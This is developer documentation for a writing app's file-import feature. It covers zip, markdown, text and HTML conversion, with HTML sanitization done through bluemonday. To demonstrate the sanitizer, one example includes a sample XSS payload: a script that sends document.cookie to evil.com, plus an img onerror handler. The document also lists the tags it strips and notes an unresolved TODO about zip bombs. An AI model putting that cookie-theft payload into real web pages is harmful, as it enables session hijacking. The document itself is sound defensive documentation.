---
stack: both
status: complete
feature: document-import
detail: standard
audience: developer
---

# Supported Import Formats

Reference guide for all supported file formats and their conversion behavior.

## Supported Formats

| Format | Extensions | Conversion | Notes |
|--------|------------|------------|-------|
| **Zip Archive** | `.zip` | Extract → Convert each file | Folder structure preserved |
| **Markdown** | `.md` | Pass-through | No conversion needed |
| **Plain Text** | `.txt` | Text → Markdown | Minimal formatting added |
| **HTML** | `.html`, `.htm` | HTML → Markdown + XSS sanitization | Semantic structure preserved |

## Format Details

### 1. Zip Archives (.zip)

**Behavior:** Extracts all files, preserves folder hierarchy, converts each file based on extension.

**Input:**
```
my-project.zip
├── chapter1.md
├── notes/
│   ├── character-notes.txt
│   └── plot-ideas.html
└── drafts/
    └── scene1.md
```

**Result:**
- `chapter1.md` → Root level document
- `notes/character-notes.txt` → Document in "notes" folder (auto-created)
- `notes/plot-ideas.html` → Document in "notes" folder (converted from HTML)
- `drafts/scene1.md` → Document in "drafts" folder (auto-created)

**Limitations:**
- Max zip size: 100MB
- Nested zips: Not supported (or flattened)
- Unsupported files inside zip: Skipped with warning

### 2. Markdown (.md)

**Behavior:** Pass-through (no conversion).

**Input:**
```markdown
# Chapter 1

This is the first chapter.

## Section 1.1

Content here.
```

**Result:** Identical markdown stored in database.

**Supported markdown features:**
- All CommonMark syntax
- GFM (GitHub Flavored Markdown) extensions
- Custom TipTap extensions (handled by editor)

**Notes:**
- Frontmatter preserved (YAML between `---` delimiters)
- Code blocks preserved with syntax highlighting info
- Images links preserved (must point to valid URLs or uploaded separately)

### 3. Plain Text (.txt)

**Behavior:** Minimal conversion to markdown format.

**Input:**
```
My Document Title

This is a paragraph of plain text.

This is another paragraph.
```

**Result:**
```markdown
My Document Title

This is a paragraph of plain text.

This is another paragraph.
```

**Conversion rules:**
- Blank lines preserved (paragraph breaks)
- No special formatting added
- If text contains markdown syntax, it's preserved as-is

**Example with existing markdown:**

**Input (.txt file):**
```
# Already has a heading

- Bullet point
- Another point
```

**Result:** Same as input (markdown syntax recognized and preserved).

**Use case:** Import plain notes, transcripts, or drafts without formatting.

### 4. HTML (.html, .htm)

**Behavior:** Two-stage conversion (Sanitize → Convert to Markdown).

**Input:**
```html
<!DOCTYPE html>
<html>
<head><title>My Document</title></head>
<body>
  <h1>Chapter 1</h1>
  <p>This is a <strong>bold</strong> paragraph.</p>

  <h2>Section 1.1</h2>
  <ul>
    <li>First item</li>
    <li>Second item</li>
  </ul>

  <script>alert('malicious code')</script>
</body>
</html>
```

**Result:**
```markdown
# Chapter 1

This is a **bold** paragraph.

## Section 1.1

- First item
- Second item
```

**Stage 1 - Sanitization (XSS Prevention):**
- Strips `<script>`, `<iframe>`, `<object>` tags
- Removes event handlers (onclick, onerror, etc.)
- Validates `href` and `src` attributes
- Allows only safe HTML tags (see below)

**Stage 2 - Markdown Conversion:**
- `<h1>-<h6>` → `# Heading` (markdown headings)
- `<strong>, <b>` → `**bold**`
- `<em>, <i>` → `*italic*`
- `<ul>, <ol>` → Markdown lists
- `<a href>` → `[text](url)`
- `<img src>` → `![alt](url)`

**Allowed HTML tags (bluemonday UGC policy):**
- **Text:** `p`, `b`, `i`, `u`, `strong`, `em`, `code`, `pre`
- **Headings:** `h1`, `h2`, `h3`, `h4`, `h5`, `h6`
- **Lists:** `ul`, `ol`, `li`
- **Quotes:** `blockquote`
- **Links:** `a` (href validated)
- **Tables:** `table`, `thead`, `tbody`, `tr`, `th`, `td` (basic structure)

**Stripped tags:**
- **Scripts:** `script`, `noscript`
- **Objects:** `object`, `embed`, `applet`
- **Frames:** `iframe`, `frame`, `frameset`
- **Forms:** `form`, `input`, `button` (unless in safe context)
- **Styles:** `style` (inline styles removed)
- **Event handlers:** `onclick`, `onerror`, `onload`, etc.

**Use cases:**
- Import HTML exports from other apps (e.g., Notion, Google Docs)
- Convert blog posts to markdown
- Archive web pages as documents

**Security guarantee:** All HTML is sanitized before storage. Malicious content cannot be injected.

## Unsupported Formats

| Format | Extension | Why Unsupported | Workaround |
|--------|-----------|----------------|------------|
| PDF | `.pdf` | Complex layout, requires OCR | Convert to .txt or .html first |
| Word | `.doc`, `.docx` | Binary format | Export as .html or .txt from Word |
| RTF | `.rtf` | Proprietary format | Convert to .txt |
| Images | `.png`, `.jpg`, `.gif` | Not text documents | (Future: Extract text via OCR) |
| Code | `.js`, `.py`, `.go` | Not documents | Import as .md with code blocks |

**Recommendation:** Export from source application as HTML or plain text before importing.

## Conversion Examples

### Example 1: Wiki Page (HTML → Markdown)

**Input (wiki-export.html):**
```html
<h1>Character Profile: Aria</h1>

<h2>Appearance</h2>
<p>Aria has <strong>red hair</strong> and <em>green eyes</em>.</p>

<h2>Abilities</h2>
<ul>
  <li>Fire magic</li>
  <li>Sword fighting</li>
  <li>Healing</li>
</ul>

<h2>Backstory</h2>
<blockquote>
  <p>"I will protect this kingdom, no matter the cost."</p>
</blockquote>
```

**Output (stored as markdown):**
```markdown
# Character Profile: Aria

## Appearance

Aria has **red hair** and *green eyes*.

## Abilities

- Fire magic
- Sword fighting
- Healing

## Backstory

> "I will protect this kingdom, no matter the cost."
```

### Example 2: Blog Post with Malicious Content

**Input (blog-post.html):**
```html
<h1>My Blog Post</h1>
<p>This is a normal paragraph.</p>

<script>
  // Steal user data
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>

<img src=x onerror="alert('XSS')">

<p>More content here.</p>
```

**Output (sanitized + converted):**
```markdown
# My Blog Post

This is a normal paragraph.

More content here.
```

**Result:** Script and malicious image completely removed. Only safe content remains.

### Example 3: Nested Zip Archive

**Input (project.zip):**
```
project.zip
├── README.md
├── chapters/
│   ├── chapter1.md
│   ├── chapter2.md
│   └── notes.txt
└── research/
    └── sources.html
```

**Output (folder structure):**
```
Root
├── README
└── chapters/
    ├── chapter1
    ├── chapter2
    └── notes
└── research/
    └── sources
```

**Notes:**
- Folder names match zip directory structure
- `.md` extension removed from document names
- All files converted to markdown during import

### Example 4: Plain Text with Manual Formatting

**Input (notes.txt):**
```
CHAPTER IDEAS
=============

Chapter 1: The Beginning
  - Introduce protagonist
  - Set up conflict
  - End with cliffhanger

Chapter 2: The Journey
  - Travel sequence
  - Meet allies
  - Face first challenge

NOTES:
  Remember to foreshadow the twist in chapter 1!
```

**Output (preserved as-is):**
```
CHAPTER IDEAS
=============

Chapter 1: The Beginning
  - Introduce protagonist
  - Set up conflict
  - End with cliffhanger

Chapter 2: The Journey
  - Travel sequence
  - Meet allies
  - Face first challenge

NOTES:
  Remember to foreshadow the twist in chapter 1!
```

**Notes:**
- Manual formatting with `===` preserved
- Indentation preserved
- No automatic markdown conversion applied
- User can manually convert to proper markdown later in editor

## Limitations

### File Size
- **Individual file:** 100MB max
- **Total upload:** 100MB max
- **Zip extraction:** No limit on extracted size (TODO: Add limit to prevent zip bombs)

### Character Encoding
- **Supported:** UTF-8 (recommended)
- **Fallback:** Latin-1, ASCII
- **Unsupported:** UTF-16, UTF-32 (may display garbled text)

**Recommendation:** Ensure files are saved as UTF-8 before importing.

### Special Characters
- **Supported:** All UTF-8 characters (emoji, accents, CJK, etc.)
- **Escape:** Markdown special characters in plain text are preserved

**Example:**
```
Input: This costs $100 and uses * for emphasis
Output: This costs $100 and uses * for emphasis
```

(No automatic escaping, user can edit if needed)

## Future Enhancements

| Format | Status | Complexity | Notes |
|--------|--------|------------|-------|
| PDF | Planned | High | Requires pdf-to-text library |
| DOCX | Planned | Medium | Use docx-to-markdown converter |
| Images (OCR) | Possible | Very High | Requires OCR service (Google Vision, Tesseract) |
| Notion Export | Possible | Low | Handle Notion's HTML format |
| Obsidian Vault | Possible | Low | Already markdown, just preserve backlinks |

## Troubleshooting

### "Unsupported file type"
- **Cause:** File extension not in allowed list
- **Fix:** Convert file to .md, .txt, or .html before importing

### "HTML conversion failed"
- **Cause:** Malformed HTML structure
- **Fix:** Validate HTML in online validator, fix errors, retry

### "File too large"
- **Cause:** File exceeds 100MB limit
- **Fix:** Split file into smaller parts, import separately

### "Empty document created"
- **Cause:** HTML contained only script tags (all stripped during sanitization)
- **Fix:** Ensure HTML has actual content (text, headings, etc.)

### "Folder structure not preserved"
- **Cause:** Zip created with flat structure (no directories)
- **Fix:** Recreate zip ensuring folder hierarchy is included

## Key Files

### Backend
- `backend/internal/service/docsystem/converter/html_converter.go` - HTML → Markdown
- `backend/internal/service/docsystem/converter/text_converter.go` - Text → Markdown
- `backend/internal/service/docsystem/converter/markdown_converter.go` - Markdown pass-through
- `backend/internal/service/docsystem/zip_file_processor.go` - Zip extraction

### Frontend
- `frontend/src/features/documents/utils/fileValidation.ts` - Extension validation
- `frontend/src/features/documents/components/ImportFileSelector.tsx` - File type filter

## References

- **HTML Sanitization:** [bluemonday documentation](https://github.com/microcosm-cc/bluemonday)
- **HTML to Markdown:** [html-to-markdown documentation](https://github.com/JohannesKaufmann/html-to-markdown)
- **CommonMark Spec:** [https://commonmark.org](https://commonmark.org)
